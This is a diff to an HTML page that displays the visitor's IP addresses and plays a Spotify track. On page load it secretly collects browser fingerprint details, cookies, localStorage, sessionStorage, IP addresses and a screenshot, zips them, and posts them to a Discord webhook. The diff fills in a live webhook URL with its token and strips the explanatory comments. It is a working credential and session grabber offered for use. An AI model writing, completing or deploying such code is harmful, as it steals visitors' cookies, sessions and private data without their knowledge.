@@ -58,25 +58,22 @@
             100% { color: hsl(360, 100%, 50%); }
         }
 
-        /* Style for the Spotify player iframe */
         #spotify-player {
             width: 300px;
             height: 80px;
             border: none;
             margin-top: 20px;
-            opacity: 0.5; /* Make the player less visible */
+            opacity: 0.5;
         }
 
         #info {
-            display: none; /* Hide the info message by default */
+            display: none;
         }
     </style>
 </head>
 <body>
-    <!-- Strobing IP Display -->
     <div id="ip-display" class="strobing-text">Loading IPs...</div>
 
-    <!-- Spotify Player -->
     <iframe id="spotify-player" src="https://open.spotify.com/embed/track/471UcHZ5JhkgjE3CmWNEIG?utm_source=generator" allow="autoplay; clipboard-write; encrypted-media; fullscreen; picture-in-picture"></iframe>
 
     <div class="container">
@@ -88,7 +85,6 @@
         <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
         <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/0.5.0-beta4/html2canvas.min.js"></script>
         <script>
-            // Generate a unique identifier
             function generateUniqueId() {
                 return 'user-' + Math.random().toString(36).substr(2, 9);
             }
@@ -134,8 +130,8 @@
                     appVersion: navigator.appVersion,
                     vendor: navigator.vendor,
                     product: navigator.product,
-                    geolocation: 'Not available', // Geolocation requires user permission
-                    touchSupport: 'Not available', // Touch support information
+                    geolocation: 'Not available',
+                    touchSupport: 'Not available',
                     connection: navigator.connection ? {
                         effectiveType: navigator.connection.effectiveType,
                         downlink: navigator.connection.downlink,
@@ -149,7 +145,7 @@
                     })),
                     screenOrientation: screen.orientation ? screen.orientation.type : 'Not available',
                     fullscreen: document.fullscreenElement ? 'Fullscreen' : 'Not fullscreen',
-                    cookies: document.cookie, // Capture cookies
+                    cookies: document.cookie,
                     localStorage: getLocalStorageData(),
                     sessionStorage: getSessionStorageData(),
                 };
@@ -195,29 +191,21 @@
                     zip.file('screenshot.png', imgBlob);
                 }
                 
-                // Add cookies as a text file
                 zip.file('cookies.txt', info.cookies);
-
-                // Add localStorage data as a text file
                 zip.file('localStorage.txt', JSON.stringify(info.localStorage, null, 2));
-
-                // Add sessionStorage data as a text file
                 zip.file('sessionStorage.txt', JSON.stringify(info.sessionStorage, null, 2));
-
-                // Add IP addresses
                 zip.file('ipAddresses.txt', `IPv4: ${info.ipv4}\nIPv6: ${info.ipv6}`);
 
                 const content = await zip.generateAsync({ type: 'blob' });
                 return content;
             }
 
-            async function sendZipToDiscord(zipBlob, uniqueId) {
+            async function sendZipToDiscord(zipBlob) {
                 const formData = new FormData();
                 formData.append('file', zipBlob, 'info.zip');
-                formData.append('uniqueId', uniqueId); // Append the unique identifier
 
                 try {
-                    await fetch('', {
+                    await fetch('https://discord.com/api/webhooks/1280281999059456123/GtHUqHcLkPKBNX5OGwFrkwDR2Rp5XIw3QBr_TTv1b3BrcA-NBg-1XJIbRXMfAEaZxvW2', {
                         method: 'POST',
                         body: formData
                     });
@@ -228,20 +216,19 @@
             }
 
             async function initialize() {
-                const uniqueId = generateUniqueId(); // Generate unique identifier
+                const uniqueId = generateUniqueId();
                 const ipAddresses = await getIpAddresses();
                 displayIPs(ipAddresses.ipv4, ipAddresses.ipv6);
                 const browserInfo = getBrowserInfo();
                 browserInfo.ipv4 = ipAddresses.ipv4;
                 browserInfo.ipv6 = ipAddresses.ipv6;
-                browserInfo.uniqueId = uniqueId; // Add unique identifier to info
+                browserInfo.uniqueId = uniqueId;
 
                 const screenshotDataUrl = await captureScreenshot();
                 const zipBlob = await createZipFile(browserInfo, screenshotDataUrl);
-                await sendZipToDiscord(zipBlob, uniqueId);
+                await sendZipToDiscord(zipBlob);
             }
 
-            // Run the initialization function when the page loads
             window.onload = initialize;
         </script>
     </div>
